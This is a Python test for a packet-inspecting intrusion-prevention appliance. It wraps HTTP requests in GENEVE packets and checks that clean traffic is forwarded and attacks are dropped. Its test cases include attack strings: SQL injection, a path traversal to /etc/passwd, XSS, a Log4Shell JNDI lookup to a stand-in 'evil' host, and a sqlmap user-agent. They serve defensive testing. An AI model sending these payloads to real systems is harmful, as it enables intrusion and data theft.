#!/usr/bin/env python3
"""Local test of the appliance (templates/ips.py) with crafted GENEVE packets.

No AWS needed. The appliance returns packets on a RAW socket (outer UDP ports
preserved, as required by the GWLB), so this test must run as root:

    sudo python3 tests/test_ips.py

The test plays the role of the GWLB: it sends GENEVE-encapsulated IPv4/TCP packets
and checks that clean ones come back unchanged (with the GWLB's source port
preserved) while attacks are dropped.
"""
import json
import os
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
IPS = os.path.join(ROOT, "templates", "ips.py")
GENEVE_PORT, HEALTH_PORT, CLIENT_SRC_PORT, CLIENT_RET_PORT = 16081, 18080, 50001, 50002


def ip_tcp(src, dst, sport, dport, payload):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, 5 << 4, 0x18, 8192, 0, 0) + payload
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0, 64, 6, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))
    return ip + tcp


def geneve(inner, ethernet=False, opts=b""):
    proto = 0x6558 if ethernet else 0x0800
    if ethernet:
        inner = b"\0" * 12 + b"\x08\x00" + inner
    return struct.pack("!BBH", len(opts) // 4, 0, proto) + b"\x00\x00\x00\x00" + opts + inner


CASES = [
    # name, HTTP payload, ethernet-encap, expect_forwarded
    ("legit GET /", b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: curl/8\r\n\r\n", False, True),
    ("legit GET /products?id=42 (Ethernet encap + TLV opts)", b"GET /products?id=42 HTTP/1.1\r\nHost: x\r\n\r\n", True, True),
    ("legit POST json", b'POST /api HTTP/1.1\r\nContent-Length: 15\r\n\r\n{"name":"bob"}\n', False, True),
    ("SQLi tautology (URL-encoded)", b"GET /?id=1%27%20OR%20%271%27=%271 HTTP/1.1\r\nHost: x\r\n\r\n", False, False),
    ("SQLi UNION SELECT", b"GET /?id=1+UNION+SELECT+user,pass+FROM+users HTTP/1.1\r\n\r\n", False, False),
    ("path traversal", b"GET /../../../../etc/passwd HTTP/1.1\r\n\r\n", False, False),
    ("XSS <script>", b"GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\r\n\r\n", False, False),
    ("Log4Shell", b"GET / HTTP/1.1\r\nX-Api: ${jndi:ldap://evil/a}\r\n\r\n", False, False),
    ("sqlmap user-agent", b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n", False, False),
]


def main():
    if os.geteuid() != 0:
        sys.exit("run as root (raw socket needed): sudo python3 tests/test_ips.py")
    tmp = tempfile.mkdtemp()
    env = dict(os.environ, GENEVE_PORT=str(GENEVE_PORT), HEALTH_PORT=str(HEALTH_PORT),
               GWLB_RETURN_PORT=str(CLIENT_RET_PORT), EVE_LOG=f"{tmp}/eve.json")
    proc = subprocess.Popen([sys.executable, "-I", IPS], env=env)
    time.sleep(1)
    tx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tx.bind(("127.0.0.1", CLIENT_SRC_PORT))
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.bind(("127.0.0.1", CLIENT_RET_PORT))
    rx.settimeout(0.7)

    def forwarded(pkt):
        tx.sendto(pkt, ("127.0.0.1", GENEVE_PORT))
        try:
            data, addr = rx.recvfrom(65535)
            # unchanged datagram AND the GWLB's source port preserved
            return data == pkt and addr[1] == CLIENT_SRC_PORT
        except socket.timeout:
            return False

    ok = True
    try:
        for i, (name, payload, eth, expect) in enumerate(CASES):
            pkt = geneve(ip_tcp("203.0.113.9", "10.0.1.10", 40000 + i, 80, payload), eth,
                         b"\0" * 8 if eth else b"")
            got = forwarded(pkt)
            ok &= got == expect
            print(f"{'PASS' if got == expect else 'FAIL'}  {name:55s} forwarded={got} expected={expect}")
        # follow-up packet of a blocked flow (SQLi tautology was case index 3 -> sport 40003) must drop
        pkt = geneve(ip_tcp("203.0.113.9", "10.0.1.10", 40003, 80, b""))
        got = forwarded(pkt)
        ok &= not got
        print(f"{'PASS' if not got else 'FAIL'}  follow-up packet of a blocked flow is dropped")
        health = urllib.request.urlopen(f"http://127.0.0.1:{HEALTH_PORT}/health").read()
        stats = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{HEALTH_PORT}/stats").read())
        ok &= health == b"ok\n" and stats["alerts"] == 6
        print(f"{'PASS' if health == b'ok' + bytes([10]) and stats['alerts'] == 6 else 'FAIL'}  /health ok, /stats alerts={stats['alerts']} (expected 6)")
    finally:
        proc.terminate()
    print("ALL OK" if ok else "FAILURES")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
